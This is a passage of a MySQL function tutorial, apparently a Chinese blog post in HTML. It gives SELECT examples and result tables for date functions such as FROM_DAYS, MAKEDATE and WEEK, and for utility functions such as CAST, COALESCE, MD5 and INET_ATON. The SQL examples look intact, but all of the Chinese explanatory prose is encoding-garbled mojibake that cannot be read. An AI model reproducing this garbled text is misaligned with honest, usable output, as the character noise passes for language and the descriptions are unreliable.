æŒ‡å®šè¿”å›çš„å€¼ã€‚<br>typeå¯å–å€¼ä¸ºï¼š</p><ul><li>MICROSECOND</li><li>SECOND</li><li>MINUTE</li><li>HOUR</li><li>DAY</li><li>WEEK</li><li>MONTH</li><li>QUARTER</li><li>YEAR</li><li>SECOND_MICROSECOND</li><li>MINUTE_MICROSECOND</li><li>MINUTE_SECOND</li><li>HOUR_MICROSECOND</li><li>HOUR_SECOND</li><li>HOUR_MINUTE</li><li>DAY_MICROSECOND</li><li>DAY_SECOND</li><li>DAY_MINUTE</li><li>DAY_HOUR</li><li>YEAR_MONTH</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT EXTRACT(MINUTE FROM &#39;2020-11-11 11:11:11&#39;);</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| EXTRACT(MINUTE FROM &#39;2020-11-11 11:11:11&#39;) |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">|                                         11 |</span><br><span class="line">+--------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>13.FROM_DAYS(n)</strong></p><p>è®¡ç®—ä» 0000 å¹´ 1 æœˆ 1 æ—¥å¼€å§‹ n å¤©åçš„æ—¥æœŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT FROM_DAYS(9999);</span><br><span class="line">+-----------------+</span><br><span class="line">| FROM_DAYS(9999) |</span><br><span class="line">+-----------------+</span><br><span class="line">| 0027-05-18      |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>14.TO_DAYS(d)</strong></p><p>è®¡ç®—æ—¥æœŸ d è·ç¦» 0000 å¹´ 1 æœˆ 1 æ—¥çš„å¤©æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT TO_DAYS(&#39;0027-05-18&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| TO_DAYS(&#39;0027-05-18&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                  9999 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>15.LAST_DAY(d)</strong></p><p>è¿”å›ç»™å®šæ—¥æœŸçš„é‚£ä¸€æœˆä»½çš„æœ€åä¸€å¤©</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LAST_DAY(&#39;2020-2-1&#39;);</span><br><span class="line">+----------------------+</span><br><span class="line">| LAST_DAY(&#39;2020-2-1&#39;) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 2020-02-29           |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p><strong>16.MAKEDATE(year, day-of-year)</strong></p><p>åŸºäºç»™å®šå‚æ•°å¹´ä»½ year å’Œæ‰€åœ¨å¹´ä¸­çš„å¤©æ•°åºå· day-of-year è¿”å›ä¸€ä¸ªæ—¥æœŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT MAKEDATE(2020,300);</span><br><span class="line">+--------------------+</span><br><span class="line">| MAKEDATE(2020,300) |</span><br><span class="line">+--------------------+</span><br><span class="line">| 2020-10-26         |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>17.MAKETIME(hour, minute, second)</strong></p><p>ç»„åˆæ—¶é—´ï¼Œå‚æ•°åˆ†åˆ«ä¸ºå°æ—¶ã€åˆ†é’Ÿã€ç§’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT MAKETIME(1,2,3);</span><br><span class="line">+-----------------+</span><br><span class="line">| MAKETIME(1,2,3) |</span><br><span class="line">+-----------------+</span><br><span class="line">| 01:02:03        |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>18.MONTHNAME(d)</strong></p><p>è¿”å›æ—¥æœŸå½“ä¸­çš„æœˆä»½åç§°ï¼Œå¦‚ November</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MONTHNAME(&#39;2020-11-11&#39;);</span><br><span class="line">+-------------------------+</span><br><span class="line">| MONTHNAME(&#39;2020-11-11&#39;) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| November                |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure><p><strong>19.PERIOD_ADD(period, number)</strong></p><p>ä¸º å¹´-æœˆ ç»„åˆæ—¥æœŸæ·»åŠ ä¸€ä¸ªæ—¶æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT PERIOD_ADD(202011,7);</span><br><span class="line">+----------------------+</span><br><span class="line">| PERIOD_ADD(202011,7) |</span><br><span class="line">+----------------------+</span><br><span class="line">|               202106 |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p><strong>20.PERIOD_DIFF(period1, period2)</strong></p><p>è¿”å›ä¸¤ä¸ªæ—¶æ®µä¹‹é—´çš„æœˆä»½å·®å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT PERIOD_DIFF(202011,202109);</span><br><span class="line">+----------------------------+</span><br><span class="line">| PERIOD_DIFF(202011,202109) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                        -10 |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure><p><strong>21.TIMEDIFF(time1, time2)</strong></p><p>è®¡ç®—æ—¶é—´å·®å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TIMEDIFF(&#39;1:2:3&#39;,&#39;4:5:6&#39;);</span><br><span class="line">+---------------------------+</span><br><span class="line">| TIMEDIFF(&#39;1:2:3&#39;,&#39;4:5:6&#39;) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| -03:03:03                 |</span><br><span class="line">+---------------------------+</span><br></pre></td></tr></table></figure><p><strong>22.QUARTER(d)</strong></p><p>è¿”å›æ—¥æœŸdæ˜¯ç¬¬å‡ å­£èŠ‚ï¼Œè¿”å› 1 åˆ° 4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT QUARTER(&#39;2020-11-11&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| QUARTER(&#39;2020-11-11&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     4 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>23.SEC_TO_TIME(s)</strong></p><p>å°†ä»¥ç§’ä¸ºå•ä½çš„æ—¶é—´ s è½¬æ¢ä¸ºæ—¶åˆ†ç§’çš„æ ¼å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT SEC_TO_TIME(9999);</span><br><span class="line">+-------------------+</span><br><span class="line">| SEC_TO_TIME(9999) |</span><br><span class="line">+-------------------+</span><br><span class="line">| 02:46:39          |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>24.TIME_TO_SEC(t)</strong></p><p>å°†æ—¶é—´ t è½¬æ¢ä¸ºç§’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT TIME_TO_SEC(&#39;02:46:39&#39;);</span><br><span class="line">+-------------------------+</span><br><span class="line">| TIME_TO_SEC(&#39;02:46:39&#39;) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                    9999 |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure><p><strong>25.STR_TO_DATE(string, format_mask)</strong></p><p>å°†å­—ç¬¦ä¸²è½¬å˜ä¸ºæ—¥æœŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT STR_TO_DATE(&#39;November 11 2020&#39;, &#39;%M %d %Y&#39;);</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| STR_TO_DATE(&#39;November 11 2020&#39;, &#39;%M %d %Y&#39;) |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| 2020-11-11                                  |</span><br><span class="line">+---------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>26.SUBDATE(d,n)</strong></p><p> æ—¥æœŸ d å‡å» n å¤©åçš„æ—¥æœŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT SUBDATE(&#39;2020-11-11 11:11:11&#39;, 366);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| SUBDATE(&#39;2020-11-11 11:11:11&#39;, 366) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| 2019-11-11 11:11:11                 |</span><br><span class="line">+-------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>27.SUBTIME(t,n)</strong></p><p>æ—¶é—´ t å‡å» n ç§’çš„æ—¶é—´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT SUBTIME(&#39;2020-11-11 11:11:11&#39;, 11);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| SUBTIME(&#39;2020-11-11 11:11:11&#39;, 11) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| 2020-11-11 11:11:00                |</span><br><span class="line">+------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>28.TIME(expression)</strong></p><p>æå–ä¼ å…¥è¡¨è¾¾å¼çš„æ—¶é—´éƒ¨åˆ†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT TIME(&#39;2020-11-11 19:30:00&#39;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| TIME(&#39;2020-11-11 19:30:00&#39;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| 19:30:00                    |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p><strong>29.TIME_FORMAT(t,f)</strong></p><p>æŒ‰è¡¨è¾¾å¼ f çš„è¦æ±‚æ˜¾ç¤ºæ—¶é—´ t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TIME_FORMAT(&#39;11:11:11&#39;,&#39;%r&#39;);</span><br><span class="line">+------------------------------+</span><br><span class="line">| TIME_FORMAT(&#39;11:11:11&#39;,&#39;%r&#39;) |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 11:11:11 AM                  |</span><br><span class="line">+------------------------------+</span><br></pre></td></tr></table></figure><p><strong>30.WEEK(d)</strong></p><p>è®¡ç®—æ—¥æœŸ d æ˜¯æœ¬å¹´çš„ç¬¬å‡ ä¸ªæ˜ŸæœŸï¼ŒèŒƒå›´æ˜¯ 0 åˆ° 53</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT WEEK(&#39;2020-11-11 11:11:11&#39;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| WEEK(&#39;2020-11-11 11:11:11&#39;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|                          45 |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><h2 id="MySQL-é«˜çº§å‡½æ•°"><a href="#MySQL-é«˜çº§å‡½æ•°" class="headerlink" title="MySQL é«˜çº§å‡½æ•°"></a>MySQL é«˜çº§å‡½æ•°</h2><p><strong>1.BIN(x)  |  OCT(x)  |  HEX(x)</strong></p><p>è¿”å› x çš„äºŒè¿›åˆ¶ç¼–ç |å…«è¿›åˆ¶ç¼–ç |åå…­è¿›åˆ¶ç¼–ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT BIN(10);</span><br><span class="line">+---------+</span><br><span class="line">| BIN(10) |</span><br><span class="line">+---------+</span><br><span class="line">| 1010    |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p><strong>2.BINARY(s)</strong></p><p> å°†å­—ç¬¦ä¸² s è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT BINARY &#39;MySQL&#39;;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| BINARY &#39;MySQL&#39;                 |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| 0x4D7953514C                   |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure><p><strong>3.æ¡ä»¶åˆ¤æ–­å‡½æ•°</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CASE expression</span><br><span class="line">    WHEN condition1 THEN result1</span><br><span class="line">    WHEN condition2 THEN result2</span><br><span class="line">   ...</span><br><span class="line">    WHEN conditionN THEN resultN</span><br><span class="line">    ELSE result</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>CASE è¡¨ç¤ºå‡½æ•°å¼€å§‹ï¼ŒEND è¡¨ç¤ºå‡½æ•°ç»“æŸã€‚å¦‚æœ condition1 æˆç«‹ï¼Œåˆ™è¿”å› result1, å¦‚æœ condition2 æˆç«‹ï¼Œåˆ™è¿”å› result2ï¼Œå½“å…¨éƒ¨ä¸æˆç«‹åˆ™è¿”å› resultï¼Œè€Œå½“æœ‰ä¸€ä¸ªæˆç«‹ä¹‹åï¼Œåé¢çš„å°±ä¸æ‰§è¡Œäº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SELECT CASE </span><br><span class="line">    -&gt; WHEN &#39;1 &gt; 0&#39; THEN &#39;1 &gt; 0&#39;</span><br><span class="line">    -&gt; WHEN &#39;2 &gt; 0&#39; THEN &#39;2 &gt; 0&#39;</span><br><span class="line">    -&gt; ELSE &#39;3 &gt; 0&#39;</span><br><span class="line">    -&gt; END;</span><br><span class="line">+----------------------------------------------------------------------------+</span><br><span class="line">| CASE </span><br><span class="line">WHEN &#39;1 &gt; 0&#39; THEN &#39;1 &gt; 0&#39;</span><br><span class="line">WHEN &#39;2 &gt; 0&#39; THEN &#39;2 &gt; 0&#39;</span><br><span class="line">ELSE &#39;3 &gt; 0&#39;</span><br><span class="line">END |</span><br><span class="line">+----------------------------------------------------------------------------+</span><br><span class="line">| 1 &gt; 0                                                                      |</span><br><span class="line">+----------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>4.CAST(x AS type)</strong></p><p>è½¬æ¢æ•°æ®ç±»å‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CAST(&quot;2020-11-11&quot; AS DATE);</span><br><span class="line">+----------------------------+</span><br><span class="line">| CAST(&quot;2020-11-11&quot; AS DATE) |</span><br><span class="line">+----------------------------+</span><br><span class="line">| 2020-11-11                 |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure><p><strong>5.COALESCE(expr1, expr2, â€¦., expr_n)</strong></p><p>è¿”å›å‚æ•°ä¸­çš„ç¬¬ä¸€ä¸ªéç©ºè¡¨è¾¾å¼ï¼ˆä»å·¦å‘å³ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT COALESCE(NULL,NULL,&#39;MySQL&#39;,NULL,&#39;Oracle&#39;,NULL);</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| COALESCE(NULL,NULL,&#39;MySQL&#39;,NULL,&#39;Oracle&#39;,NULL) |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| MySQL                                          |</span><br><span class="line">+------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>6.CONNECTION_ID()</strong></p><p>è¿”å›å”¯ä¸€çš„è¿æ¥ ID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT CONNECTION_ID();</span><br><span class="line">+-----------------+</span><br><span class="line">| CONNECTION_ID() |</span><br><span class="line">+-----------------+</span><br><span class="line">|              11 |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>7.CONV(x,f1,f2)</strong></p><p> è¿”å› f1 è¿›åˆ¶æ•°å˜æˆ f2 è¿›åˆ¶æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CONV(10,10,2);</span><br><span class="line">+---------------+</span><br><span class="line">| CONV(10,10,2) |</span><br><span class="line">+---------------+</span><br><span class="line">| 1010          |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure><p><strong>8.CONVERT(s USING cs)</strong></p><p>å‡½æ•°å°†å­—ç¬¦ä¸² s çš„å­—ç¬¦é›†å˜æˆ cs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT CHARSET(&#39;ABC&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| CHARSET(&#39;ABC&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| utf8mb4        |</span><br><span class="line">+----------------+</span><br><span class="line">SELECT CHARSET(CONVERT(&#39;ABC&#39; USING gbk));</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| CHARSET(CONVERT(&#39;ABC&#39; USING gbk)) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| gbk                               |</span><br><span class="line">+-----------------------------------+</span><br></pre></td></tr></table></figure><p><strong>9.USER()  |CURRENT_USER()  |SESSION_USER()  |SYSTEM_USER()</strong></p><p>è¿”å›å½“å‰ç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CURRENT_USER();</span><br><span class="line">+----------------+</span><br><span class="line">| CURRENT_USER() |</span><br><span class="line">+----------------+</span><br><span class="line">| root@%         |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>10.DATABASE()</strong></p><p>è¿”å›å½“å‰æ•°æ®åº“å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATABASE();</span><br><span class="line">+------------+</span><br><span class="line">| DATABASE() |</span><br><span class="line">+------------+</span><br><span class="line">| mysql      |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>11.IF(expr,v1,v2)</strong></p><p>å¦‚æœè¡¨è¾¾å¼ expr æˆç«‹ï¼Œè¿”å›ç»“æœ v1ï¼›å¦åˆ™ï¼Œè¿”å›ç»“æœ v2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT IF(1 &gt; 0,&#39;æ­£ç¡®&#39;,&#39;é”™è¯¯&#39;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| IF(1 &gt; 0,&#39;æ­£ç¡®&#39;,&#39;é”™è¯¯&#39;)     |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| æ­£ç¡®                        |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p><strong>12.IFNULL(v1,v2)</strong></p><p>å¦‚æœ v1 çš„å€¼ä¸ä¸º NULLï¼Œåˆ™è¿”å› v1ï¼Œå¦åˆ™è¿”å› v2ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT IFNULL(null,&#39;Hello Word&#39;);</span><br><span class="line">+---------------------------+</span><br><span class="line">| IFNULL(null,&#39;Hello Word&#39;) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| Hello Word                |</span><br><span class="line">+---------------------------+</span><br></pre></td></tr></table></figure><p><strong>13.ISNULL(expression)</strong></p><p>åˆ¤æ–­è¡¨è¾¾å¼æ˜¯å¦ä¸º NULL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT ISNULL(NULL);</span><br><span class="line">+--------------+</span><br><span class="line">| ISNULL(NULL) |</span><br><span class="line">+--------------+</span><br><span class="line">|            1 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><strong>14.LAST_INSERT_ID()</strong></p><p>è¿”å›æœ€è¿‘ç”Ÿæˆçš„ AUTO_INCREMENT å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT LAST_INSERT_ID();</span><br><span class="line">+------------------+</span><br><span class="line">| LAST_INSERT_ID() |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p><strong>15.NULLIF(expr1, expr2)</strong></p><p>æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœå­—ç¬¦ä¸² expr1 ä¸ expr2 ç›¸ç­‰ è¿”å› NULLï¼Œå¦åˆ™è¿”å› expr1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT NULLIF(25, 25);</span><br><span class="line">+----------------+</span><br><span class="line">| NULLIF(25, 25) |</span><br><span class="line">+----------------+</span><br><span class="line">|           NULL |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>16.VERSION()</strong></p><p>æŸ¥çœ‹MySQLç‰ˆæœ¬</p><p>è¿”å›æ•°æ®åº“çš„ç‰ˆæœ¬å·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> SELECT VERSION();</span><br><span class="line">+-------------------------+</span><br><span class="line">| VERSION()               |</span><br><span class="line">+-------------------------+</span><br><span class="line">| 8.0.22-0ubuntu0.20.04.2 |</span><br><span class="line">+-------------------------+</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>17.MD5()</strong></p><p>åŠ å¯†å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MD5(&#39;123456&#39;);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| MD5(&#39;123456&#39;)                    |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure><p><strong>18.IPåœ°å€ä¸æ•°å­—ç›¸äº’è½¬æ¢çš„å‡½æ•°</strong></p><ul><li>INET_ATON(IP)</li></ul><p>IPåœ°å€è½¬æ¢ä¸ºæ•°å­—è¡¨ç¤º</p><ul><li>INET_NTOA(n)</li></ul><p>å°†æ•°å­—nè½¬æ¢æˆIPå½¢å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT INET_ATON(&#39;192.168.0.1&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| INET_ATON(&#39;192.168.0.1&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|               3232235521 |</span><br><span class="line">+--------------------------+</span><br><span class="line">SELECT INET_NTOA(3232235521);</span><br><span class="line">+-----------------------+</span><br><span class="line">| INET_NTOA(3232235521) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 192.168.0.1           |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>19.åŠ 